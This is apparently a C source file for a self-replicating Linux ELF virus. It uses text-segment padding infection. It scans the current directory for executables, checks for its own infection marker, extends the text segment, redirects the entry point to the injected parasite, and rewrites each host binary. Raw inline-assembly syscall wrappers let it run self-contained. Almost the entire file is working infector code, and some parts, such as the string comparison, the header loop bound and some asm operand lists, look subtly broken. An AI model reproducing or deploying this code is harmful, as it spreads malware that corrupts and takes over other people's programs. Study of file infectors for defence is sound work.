#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <elf.h>
#include <linux/fcntl.h>
//syscall id is in /usr/include/asm/unistd_NR.h
#include <asm/unistd.h>
#include <sys/stat.h>

#define PAGE_SIZE 4096
#define BUF_SIZE 1024

unsigned long get_rip(void);
int strcmp(const char *s1, const char *s2);
void mirror_binary_with_parasite(unsigned int parasite_size, 
	char *mem, unsigned long end_of_text, struct stat st,
	char *host, unsigned long address_of_main);

extern int real_start;
extern int foobar;
extern int myexit;

unsigned long old_e_entry;

_start(){
	__asm__(".globl real_start\n"
		"real_start:\n"
		"push %rax\n"
		"push %rcx\n"
		"push %rdx\n"
		"push %rbx\n"
		"push %rsp\n"
		"push %rbp\n"
		"push %rsi\n"
		"push %rdi\n"
		"call do_main\n"
		"pop %rdi\n"
		"pop %rsi\n"
		"pop %rbp\n"
		"pop %rsp\n"
		"pop %rbx\n"
		"pop %rbx\n"
		"pop %rcx\n"
		"pop %rax\n"
		"jmp myexit\n");
}

do_main(){
	
	struct linux_dirent{
		unsigned long d_ino;
		unsigned long d_off;
		unsigned short d_reclen; /* Length of this linux_dirent */
		char d_name[];
	};

	struct linux_dirent *d;
	struct stat st;

	char buf[BUF_SIZE];
	char cwd[2];
	char *host;

	int dd, fd, i;
	int bpos; /* buf position */
	int infected;
	int text_found = 0;
	unsigned long text, end_of_text;
	int magic = 32769;
	int nread;	

	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;

	/* get the start address of parasite */
	unsigned long address_of_main = get_rip() - 
		((char*)&foobar - (char*)&real_start);
	
	unsigned int parasite_size = (char*)&myexit - (char*)&real_start;

	/* add the jmp code size */
	parasite_size += 7;

	cwd[0] = '.';
	cwd[1] = '\0';
	
	dd = open(cwd, O_RDONLY | O_DIRECTORY);

	nread = getdents(dd, buf, BUF_SIZE);

	for(bpos = 0; bpos < nread;){
		d = (struct linux_dirent*)(buf + bpos);
		bpos += d->d_reclen;
		host = d->d_name;

		if(host[0] == '.')
			continue;
		if(host[0] == 'l')
			continue;

		fd = open(host, O_RDONLY);
		stat(host, &st);
		char mem[st.st_size];
		
		infected = 0;
		read(fd, mem, st.st_size);

		ehdr = (Elf64_Ehdr *)mem;
		if(ehdr->e_ident[0] != 0x7f && strcmp(&ehdr->e_ident[1], "ELF")){
			close(fd);
			continue;
		} else{
			/* Check the file has been infected*/
			phdr = (Elf64_Phdr*)(mem + ehdr->e_phoff);
			for(i = 0; i < ehdr->e_phentsize; phdr++, i++){
				if(phdr->p_type == PT_LOAD){
					if(phdr->p_flags == (PF_R | PF_X)){
						unsigned int pt = (PAGE_SIZE - 4) - parasite_size;
						unsigned int m;
						pt += phdr->p_offset + phdr->p_filesz;
						m = *(int*)&mem[pt];
						if(m == magic)
							infected++;
						break;
					}
				}
			}
		}

		if(infected){
			char t[3] = {'o', 'k', '\0'};
			write(1, t, 2);
			close(fd);
			continue;
		}
		else{
			phdr = (Elf64_Phdr *)(mem + ehdr->e_phoff);
			for(i = 0; i < ehdr->e_phentsize; phdr++, i++){
				if(text_found){
					phdr->p_offset += PAGE_SIZE;
				} else if(phdr->p_type == PT_LOAD){
					if(phdr->p_flags == (PF_R | PF_X)){
						/* It's the TEXT segment */
						old_e_entry = ehdr->e_entry;
						/* Modify the entry to the parasite */
						ehdr->e_entry = phdr->p_vaddr + phdr->p_filesz;
						end_of_text = phdr->p_offset + phdr->p_filesz; 
						phdr->p_filesz += parasite_size;
						phdr->p_memsz += parasite_size;
						text_found = 1;
					}
				}
			}
		}
		
		/* increase the section's offset, which after parasite */
		shdr = (Elf64_Shdr*)(mem + ehdr->e_shoff);
		for(i = 0; i < ehdr->e_shnum; i++, shdr++){
			if(shdr->sh_offset >= end_of_text)
				shdr->sh_offset += PAGE_SIZE;
			else if(shdr->sh_addr + shdr->sh_size == ehdr->e_entry)
				shdr->sh_size += parasite_size;
		}
		ehdr->e_shoff += PAGE_SIZE;
		mirror_binary_with_parasite(parasite_size, mem, end_of_text,
				st, host, address_of_main);
		close(fd);
		break;
	}
	close(dd);
}

void mirror_binary_with_parasite(unsigned int parasite_size, 
	char *mem, unsigned long end_of_text, struct stat st,
	char *host, unsigned long address_of_main){
	int ofd, i;
	int magic = 32769;
	char tmp[3] = {'.', 'v', '\0'};
	char jmp_code[7];

	jmp_code[0] = '\x68'; /* push */
	jmp_code[1] = '\x00'; /* 00 */
	jmp_code[2] = '\x00'; /* 00 */
	jmp_code[3] = '\x00'; /* 00 */
	jmp_code[4] = '\x00'; /* 00 */
	jmp_code[5] = '\xc3'; /* ret */
	jmp_code[6] = '\0';
	
	ofd = open(tmp, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode);

	write(ofd, mem, end_of_text);
	write(ofd, (char *)address_of_main, parasite_size-7);
	*(int*)&jmp_code[1] = old_e_entry;
	write(ofd, jmp_code, 7);
	
	lseek(ofd, (PAGE_SIZE - 4) - parasite_size, SEEK_CUR);
	write(ofd, &magic, sizeof(magic));

	mem += end_of_text;
	unsigned long last_chunk = st.st_size - end_of_text;
	write(ofd, mem, last_chunk);
	rename(tmp, host);
	close(ofd);
}

int strcmp(const char *s1, const char *s2){
	while(*s1 != '\0' && *s2 != '\0'){
		s1++; s2++;
	}
	if(*s1 == *s2) return 0;
	else if(*s1 > *s2) return 1;
	else return -1;
}

unsigned long get_rip(void){
	/* rax get the address of $foobar */
	__asm__(".globl foobar\n"
		"call foobar\n"
		"foobar:"
		"pop %rax");
}

#define __syscall0(type, name) \
type name(void) \
{ \
long __res; \
__asm__ volatile ("mov %0, %%rax\n" \
		"syscall" \
		: : "g" (__NR_##name)); \
__asm__ ("mov %%rax, %0" : "=r"(__res)); \
return (type)__res; \
}

#define __syscall1(type, name, type1, arg1) \
type name(type1 arg1) \
{ \
long __res; \
__asm__ volatile ("mov %1, %%rdi\n" \
		"mov %0, %%rax\n" \
		"syscall\n" \
		: : "g" (__NR_##name), "g"((long)(arg1))); \
__asm__ ("mov %%rax, %0" : "=r"(__res)); \
return (type)__res; \
}

#define __syscall2(type, name, type1, arg1, type2, arg2) \
type name(type1 arg1, type2 arg2) \
{ \
long __res; \
__asm__ __volatile__ ( \
		"mov %1, %%rdi\n" \
		"mov %2, %%rsi\n" \
		"mov %0, %%rax\n" \
		"syscall" \
		: : "g" (__NR_##name), "g"((long)(arg1)), \
		"g"((long)(arg2))); \
__asm__ ("mov %%rax, %0" : "=r"(__res));\
return (type)__res; \
}

/* x64_asm
 * do not use like "=r"(__res)
 * otherwise Error: unsupported for 'mov'
 */
#define __syscall3(type, name, type1, arg1, type2, arg2, type3, arg3) \
type name(type1 arg1, type2 arg2, type3 arg3) \
{ \
long __res; \
__asm__ __volatile__ ( \
		"mov %1, %%rdi\n" \
		"mov %2, %%rsi\n" \
		"mov %3, %%rdx\n" \
		"mov %0, %%rax\n" \
		"syscall" \
		: : "g" (__NR_##name), "g"((long)(arg1)), \
		"g"((long)(arg2)), \
		"g"((long)(arg3))); \
__asm__ ("mov %%rax, %0" : "=r"(__res));\
return (type)__res; \
}

#define __syscall4(type, name, type1, arg1, type2, arg2, \
		type3, arg3, type4, arg4) \
type name(type1 arg1, type2 arg2, type3 arg3, type4 arg4) \
{ \
long __res; \
__asm__ __volatile__ ( \
		"mov %1, %%rdi\n" \
		"mov %2, %%rsi\n" \
		"mov %3, %%rdx\n" \
		"mov %4, %%r10\n" \
		"mov %0, %%rax\n" \
		"syscall" \
		: : "g" (__NR_##name), "g"((long)(arg1)), \
		"g"((long)(arg2)), \
		"g"((long)(arg3))), \
		"g"((long)(arg4)); \
__asm__ ("mov %%rax, %0" : "=r"(__res));\
return (type)__res; \
}

#define __syscall5(type, name, type1, arg1, type2, arg2, \
		type3, arg3, type4, arg4, type5, arg5) \
type name(type1 arg1, type2 arg2, type3 arg3, type4 arg4, type5 arg5) \
{ \
long __res; \
__asm__ __volatile__ ( \
		"mov %1, %%rdi\n" \
		"mov %2, %%rsi\n" \
		"mov %3, %%rdx\n" \
		"mov %4, %%r10\n" \
		"mov %5, %%r8\n" \
		"mov %0, %%rax\n" \
		"syscall" \
		: : "g" (__NR_##name), "g"((long)(arg1)), \
		"g"((long)(arg2)), \
		"g"((long)(arg3))), \
		"g"((long)(arg4)), \
		"g"((long)(arg5)); \
__asm__ ("mov %%rax, %0" : "=r"(__res));\
return (type)__res; \
}

#define __syscall6(type, name, type1, arg1, type2, arg2, \
		type3, arg3, type4, arg4, type5, arg5, type6, arg6) \
type name(type1 arg1, type2 arg2, type3 arg3, \
		type4 arg4, type5 arg5, type6 arg6) \
{ \
long __res; \
__asm__ __volatile__ ( \
		"mov %1, %%rdi\n" \
		"mov %2, %%rsi\n" \
		"mov %3, %%rdx\n" \
		"mov %4, %%r10\n" \
		"mov %5, %%r8\n" \
		"mov %6, %%r9\n" \
		"mov %0, %%rax\n" \
		"syscall" \
		: : "g" (__NR_##name), "g"((long)(arg1)), \
		"g"((long)(arg2)), \
		"g"((long)(arg3))), \
		"g"((long)(arg4)), \
		"g"((long)(arg5)), "g"((long)(arg6)); \
__asm__ ("mov %%rax, %0" : "=r"(__res));\
return (type)__res; \
}

__syscall1(void, exit, int, status);
__syscall3(ssize_t, write, int, fd, const void*, buf, size_t, count);
__syscall3(off_t, lseek, int, fd, off_t, offset, int, whence);
__syscall2(int, fstat, int, fd, struct stat *, buf);
__syscall2(int, rename, const char *, oldpath, const char *, newpath);
__syscall3(int, open, const char *, pathname, int, flags, mode_t, mode);
__syscall1(int, close, int, fd);
__syscall3(int, getdents, unsigned int, fd, struct linux_dirent *, dirp,
		unsigned int, count);
__syscall3(ssize_t, read, int, fd, void *, buf, size_t, count);
__syscall2(int, stat, const char *, pathname, struct stat *, buf);


void exit_code(){
	__asm__(".globl myexit\n"
		"myexit:\n"
		"mov $60, %rax\n"
		"mov $0, %rdi\n"
		"syscall\n");
}
